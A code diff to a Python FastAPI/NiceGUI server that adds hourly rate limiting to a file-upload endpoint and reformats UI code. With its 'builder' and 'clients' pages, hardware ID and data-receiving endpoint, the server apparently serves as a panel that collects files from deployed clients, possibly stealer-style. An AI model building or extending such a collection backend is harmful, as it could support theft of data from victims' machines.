@@ -1,5 +1,6 @@
 import os
 import uvicorn
+import asyncio
 import aiohttp
 import aiosqlite
 import subprocess
@@ -19,13 +20,20 @@ from ui.pages.builder_page import builder
 from ui.pages.settings_page import settings_stuff
 from ui.pages.clients_page import clients_page_stuff
 
-from fastapi import FastAPI, File, UploadFile, HTTPException
+from slowapi import Limiter, _rate_limit_exceeded_handler
+from slowapi.util import get_remote_address
+from slowapi.errors import RateLimitExceeded
+
+from fastapi import FastAPI, File, UploadFile, HTTPException, Request
 from fastapi.responses import JSONResponse
 
 
-from nicegui import ui
+from nicegui import ui, app
 
+limiter = Limiter(key_func=get_remote_address)
 app = FastAPI()
+app.state.limiter = limiter
+app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
 
 
 good_dir = os.getenv("APPDATA")
@@ -46,6 +54,7 @@ lines = result.strip().split("\n")
 hwid = lines[2].strip()
 
 NOTIFICATIONS = Notifications(discord=False, windows=True)
+
 
 async def initialize_database():
     """Initialize the database if it doesn't exist."""
@@ -73,7 +82,8 @@ async def on_startup():
 
 
 @app.post("/data")
-async def receive_data(file: UploadFile = File(...)) -> JSONResponse:
+@limiter.limit("1/hour", error_message="Only 1 request per hour allowed")
+async def receive_data(request: Request, file: UploadFile = File(...)) -> JSONResponse:
     """Receive data from the client and store it in the database.
 
     Args:
@@ -204,14 +214,16 @@ async def main():
         avatar = f"https://robohash.org/{user_id}?set=any"
 
         await ui.context.client.connected()
-        with ui.scroll_area().classes('w-full h-full max-w-2xl mx-auto items-stretch') as chat_area:
+        with ui.scroll_area().classes(
+            "w-full h-full max-w-2xl mx-auto items-stretch"
+        ) as chat_area:
             with ui.column().classes(
                 "w-full max-w-2xl mx-auto items-stretch"
             ):  # Align messages to the end (right)
                 await chat_messages(user_id, chat_area)
             chat_area.scroll_to(percent=1)
 
-        with ui.row().style('height: 50px;'):
+        with ui.row().style("height: 50px;"):
             with ui.avatar().on("click", lambda: ui.navigate.to(main)):
                 ui.image(avatar)
             text = (
